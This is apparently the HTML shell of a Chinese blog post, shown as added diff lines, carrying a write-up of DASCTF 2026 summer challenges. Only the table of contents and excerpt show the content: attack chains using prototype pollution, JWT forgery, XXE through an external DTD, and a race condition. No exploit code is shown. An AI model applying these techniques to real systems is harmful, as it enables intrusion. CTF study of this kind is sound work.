href="#3-%E6%8A%A5%E5%91%8A%E6%89%A7%E8%A1%8C%E6%8E%A5%E5%8F%A3-flag-%E8%AF%BB%E5%8F%96%E7%AB%AF%E7%82%B9-routesdiagnosticjs"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3. 报告执行接口 — Flag 读取端点 (routes&#x2F;diagnostic.js)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-admin-%E9%9D%A2%E6%9D%BF-%E5%90%88%E6%B3%95%E5%88%9B%E5%BB%BA-diagnostic-entry-routesadminjs"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4. Admin 面板 — 合法创建 Diagnostic Entry (routes&#x2F;admin.js)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4-exp"><span class="toc-number">1.4.</span> <span class="toc-text"> 完整 Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text"> 攻击链总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 踩坑记录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#taxmanager"><span class="toc-number">2.</span> <span class="toc-text"> TaxManager</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text"> 解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text"> 利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step-1-%E5%87%86%E5%A4%87%E5%A4%96%E9%83%A8%E6%81%B6%E6%84%8F-dtd"><span class="toc-number">2.2.1.</span> <span class="toc-text"> Step 1: 准备外部恶意 DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-%E4%BF%AE%E5%A4%8D-payload-%E5%B9%B6%E6%9B%B4%E6%96%B0-gist"><span class="toc-number">2.2.2.</span> <span class="toc-text"> Step 2: 修复 Payload 并更新 Gist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-3-%E6%9E%84%E9%80%A0%E7%BA%AF%E5%87%80-xml-%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.3.</span> <span class="toc-text"> Step 3: 构造纯净 XML 触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-4-%E8%8E%B7%E5%8F%96-flag"><span class="toc-number">2.2.4.</span> <span class="toc-text"> Step 4: 获取 Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.</span> <span class="toc-text"> 知识点总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#inkverse"><span class="toc-number">3.</span> <span class="toc-text"> InkVerse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E6%80%BB%E8%A7%88-2"><span class="toc-number">3.1.</span> <span class="toc-text"> 解题思路总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="toc-number">3.2.</span> <span class="toc-text"> 关键源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%93%E8%B5%8F%E6%8E%A5%E5%8F%A3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%85%A5%E5%8F%A3-apitip"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 1. 打赏接口 — 条件竞争入口 (&#x2F;api&#x2F;tip)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%87%E7%AB%A0%E5%AF%BC%E5%87%BA%E6%8E%A5%E5%8F%A3-token-%E6%B3%84%E9%9C%B2%E6%BA%90-apiexport"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 2. 文章导出接口 — Token 泄露源 (&#x2F;api&#x2F;export)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%89%B9%E8%89%B2%E6%96%87%E7%AB%A0%E7%94%B3%E8%AF%B7-%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86%E7%AB%AF%E7%82%B9-apireviewfeature"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 3. 特色文章申请 — 异步处理端点 (&#x2F;api&#x2F;review&#x2F;feature)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%AC%E5%91%8A%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0-flag-%E6%9A%B4%E9%9C%B2%E8%A7%A6%E5%8F%91%E5%99%A8-apibulletinrefresh"><span class="toc-number">3.2.4.</span> <span class="toc-text"> 4. 公告缓存刷新 — Flag 暴露触发器 (&#x2F;api&#x2F;bulletin&#x2F;refresh)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4-exploit%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%93%8D%E4%BD%9C"><span class="toc-number">3.3.</span> <span class="toc-text"> 完整 Exploit（浏览器控制台操作）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step-1-%E6%B3%A8%E5%86%8C%E5%B9%B6%E7%99%BB%E5%BD%95%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="toc-number">3.3.1.</span> <span class="toc-text"> Step 1: 注册并登录普通用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%8F%90%E5%8D%87%E5%A3%B0%E6%9C%9B"><span class="toc-number">3.3.2.</span> <span class="toc-text"> Step 2: 条件竞争提升声望</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-3-%E5%8F%91%E5%B8%83%E5%B9%B6%E6%89%B9%E5%87%86%E8%87%AA%E5%B7%B1%E7%9A%84%E6%96%87%E7%AB%A0"><span class="toc-number">3.3.3.</span> <span class="toc-text"> Step 3: 发布并批准自己的文章</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-4-%E5%AF%BC%E5%87%BA%E6%96%87%E7%AB%A0%E8%8E%B7%E5%8F%96-feature-token"><span class="toc-number">3.3.4.</span> <span class="toc-text"> Step 4: 导出文章获取 Feature-Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-5-%E6%8F%90%E4%BA%A4%E7%89%B9%E8%89%B2%E6%96%87%E7%AB%A0%E7%94%B3%E8%AF%B7%E5%B9%B6%E8%BD%AE%E8%AF%A2%E7%8A%B6%E6%80%81"><span class="toc-number">3.3.5.</span> <span class="toc-text"> Step 5: 提交特色文章申请并轮询状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-6-%E5%88%B7%E6%96%B0%E5%85%AC%E5%91%8A%E7%BC%93%E5%AD%98%E5%B9%B6%E8%8E%B7%E5%8F%96-flag"><span class="toc-number">3.3.6.</span> <span class="toc-text"> Step 6: 刷新公告缓存并获取 Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93-2"><span class="toc-number">3.4.</span> <span class="toc-text"> 攻击链总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-2"><span class="toc-number">3.5.</span> <span class="toc-text"> 踩坑记录</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ether" class="lazyload">
+  <div class="sidebar-author-name">Ether</div>
+  <div class="sidebar-description">求索本身即是归路</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=2930289360@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/yourname itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/friends" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  <script>
+    var ALGOLIA_CONFIG = {
+      logo: "/images/algolia_logo.svg",
+      algolia: {
+        applicationID: "${ALGOLIA_APP_ID}",
+        apiKey: "${ALGOLIA_SEARCH_KEY}",
+        indexName: "${ALGOLIA_INDEX_NAME}",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": "搜索.....",
+          "hits_empty": "未发现与 「${query}」相关内容",
+          "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
+        }
+      }
+    };
+  </script>
+  
+<script src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js" integrity="sha384-xvLS0jfKuoREs7pqkRI&#x2F;OI8GcqohO5S+jQz7ZBtQXnsXmD+9jDOOY4cL6dCPzlrk" crossorigin="anonymous" defer></script>
+
+  
+<script src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js" integrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l+M5Q2WH&#x2F;Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous" defer></script>
+
+  
+<script src="/js/algolia_search.js" defer></script>
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Ether",
+          title: "2026 DASCTF夏季赛",
+          url: "http://ether-lin.cn/2026/05/30/2026-DASCTF%E5%A4%8F%E5%AD%A3%E8%B5%9B/",
+          excerpt: "",
+          description: "",
+          stripContent: " CorpGate  题目概述 本题是一条精心设计的三段式攻击链：原型链污染触发 JWT 签名密钥轮换 → 伪造 Admin Token → 通过合法 Admin 接口获取一次性诊断引用 → 执行命令读取 Flag。题目综合考察了 Node.js 原型链污染、JWT 安全机制以及代码审计能力。  解题思路总览 12345678910111213141516171819普通用户注册/登录       ↓POST /api/settings (原型链污染)       ↓Object.prototy",
+          date: "Sat May 30 2026 17:04:59 GMT+0800",
+          updated: "Sat May 30 2026 17:08:50 GMT+0800",
+          cover: "/images/covers/06.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.5' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js" integrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC+gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous" defer onload="renderMathInElement(_$(&#39;article&#39;), {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+  </body>
+  </html>
